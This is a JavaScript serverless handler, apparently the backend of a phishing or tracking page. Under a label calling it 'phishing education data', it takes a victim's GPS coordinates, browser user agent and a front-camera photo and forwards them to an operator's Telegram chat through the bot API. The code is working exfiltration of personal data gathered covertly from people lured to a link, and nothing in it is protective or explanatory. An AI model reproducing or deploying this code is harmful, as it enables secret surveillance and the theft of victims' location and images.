const crypto = require('crypto');

module.exports = async (req, res) => {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { chatId, token, location, photo, userAgent } = req.body;

  // Validasi token
  const SECRET_KEY = process.env.SECRET_KEY;
  const expectedToken = generateToken(chatId, SECRET_KEY);
  if (token !== expectedToken) {
    return res.status(403).json({ success: false, message: 'Invalid token' });
  }

  const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;

  try {
    // Kirim lokasi
    if (location && location.latitude && location.longitude) {
      await sendTelegramLocation(TELEGRAM_BOT_TOKEN, chatId, location.latitude, location.longitude);
    }

    // Buat pesan
    let message = `📱 Data Edukasi Phishing\n`;
    if (location && location.latitude && location.longitude) {
      message += `📍 Lokasi: ${location.latitude}, ${location.longitude}\n`;
    } else {
      message += `📍 Lokasi: Tidak berhasil diperoleh\n`;
    }
    message += `🌐 Browser: ${userAgent || 'Tidak diketahui'}\n`;
    message += `📸 Foto: ${photo ? 'Tersedia' : 'Tidak tersedia'}`;

    await sendTelegramMessage(TELEGRAM_BOT_TOKEN, chatId, message);

    // Jika ada foto, kirim foto
    if (photo) {
      try {
        const base64Data = photo.replace(/^data:image\/jpeg;base64,/, "");
        await sendTelegramPhoto(TELEGRAM_BOT_TOKEN, chatId, base64Data, 'Foto dari kamera depan pengguna');
      } catch (photoError) {
        console.error('Error sending photo:', photoError);
        await sendTelegramMessage(TELEGRAM_BOT_TOKEN, chatId, '⚠️ Gagal mengirim foto');
      }
    }

    res.json({ success: true });
  } catch (error) {
    console.error('Error:', error);
    res.status(500).json({ success: false, error: error.message });
  }
};

function generateToken(chatId, secretKey) {
  const hmac = crypto.createHmac('sha256', secretKey);
  hmac.update(chatId.toString());
  return hmac.digest('hex').slice(0, 12);
}

async function sendTelegramLocation(botToken, chatId, lat, lng) {
  const url = `https://api.telegram.org/bot${botToken}/sendLocation`;
  const response = await fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: chatId, latitude: lat, longitude: lng })
  });
  return response.json();
}

async function sendTelegramMessage(botToken, chatId, text) {
  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
  const response = await fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: chatId, text })
  });
  return response.json();
}

async function sendTelegramPhoto(botToken, chatId, photoData, caption) {
  // Untuk mengirim foto, kita perlu menggunakan FormData
  // Tapi karena di serverless, kita akan menggunakan method alternatif
  const url = `https://api.telegram.org/bot${botToken}/sendPhoto`;
  const response = await fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: chatId,
      photo: photoData,
      caption: caption
    })
  });
  return response.json();
      }
